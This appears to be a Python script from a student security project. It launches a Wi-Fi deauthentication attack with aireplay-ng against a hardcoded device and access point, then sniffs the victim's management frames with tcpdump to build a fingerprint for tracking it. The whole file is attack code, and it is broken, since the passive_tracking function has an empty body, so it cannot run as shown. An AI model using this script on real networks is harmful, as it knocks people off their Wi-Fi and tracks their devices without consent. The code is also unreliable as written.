import os
import sys
from scapy.all import *

# import my own files function
# sys.path.append(os.path.abspath("/root/PycharmProjects/EE209AS-Embedded-System-Security"))
from device_signature import *


def deauth(monitor_card, target, AP):
    # initiate deauth attack
    file = "active_track.pcap"
    os.system("aireplay-ng --deauth 100 -a " + AP + " -c " + target + " " + monitor_card)
    #scapy_pack = sniff(iface=monitor_card,
    #                   filter="ether src " + target + " and type mgt and not subtype beacon", count=10)

    # capture probe request and authentification
    os.system("timeout 240 tcpdump -i " + monitor_card + " -s 0 -w " + file + ' -v '
              + "ether src " + target + " and type mgt and not subtype beacon")
    packets = rdpcap(file)
    packets.summary()

    # build device signature
    new_sig = build_WifiSig(file, target)
    new_sig.display()
    # return the signature only if it builds a complete signature
    return new_sig if new_sig.has_probe & new_sig.has_ass == 1 else None


def passive_tracking():

if __name__ == "__main__":
    target_mac = "7c:50:49:27:33:e3"
    ap_mac = '08:95:2a:6e:18:b8'
    monitor_card = 'wlan1mon'

    deauth(monitor_card, target_mac, ap_mac)